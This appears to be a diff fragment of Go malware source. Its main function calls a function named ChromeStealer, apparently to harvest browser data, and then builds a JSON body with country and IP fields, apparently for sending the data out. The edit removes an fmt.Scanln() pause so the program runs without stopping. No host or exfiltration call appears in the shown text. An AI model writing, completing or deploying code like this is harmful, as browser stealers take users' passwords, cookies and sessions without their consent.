@@ -15,8 +15,6 @@ var ConfigUserId string
 func main() {
 	jsonString := ChromeStealer()
 
-	fmt.Scanln()
-
 	postBody, _ := json.Marshal(map[string]string{
 		"country_code": "in",
 		"ip":           "1.2.3.5",
